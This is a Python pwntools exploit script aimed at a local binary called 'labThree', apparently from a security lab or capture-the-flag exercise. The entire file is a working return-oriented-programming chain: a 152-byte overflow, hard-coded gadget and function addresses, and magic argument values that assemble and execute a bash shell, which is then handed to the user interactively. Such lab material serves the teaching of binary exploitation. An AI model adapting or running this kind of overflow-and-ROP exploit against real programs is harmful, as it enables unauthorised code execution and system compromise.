#!/usr/bin/python

from pwn import *

def main():
    # start a process
    p = process("./labThree")

    # create payload
    add_bin = 0x080491b6
    add_bash = 0x0804920f
    exec_string = 0x08049182
    pop_ret = 0x0804933b
    pop_pop_ret = 0x0804933a
    pop_pop_pop_ret = 0x08049339
    payload = b"A" * 152 + p32(add_bin)

    # send to payload
    payload += p32(pop_pop_pop_ret)
    payload += p32(0xff424242)
    payload += p32(0xffff4141)
    payload += p32(0xdeadbeef)
    payload += p32(add_bash)

    # step2
    payload += p32(pop_pop_ret)
    payload += p32(0xcafebabe)
    payload += p32(0xffffffff)

    # step 3
    payload += p32(exec_string)
    payload += p32(pop_ret)
    payload += p32(0xabcdabcd)

    # send the payload to the binary
    p.send(payload)

    # pass interaction bac to the user
    p.interactive()

if __name__ == "__main__":
    main()
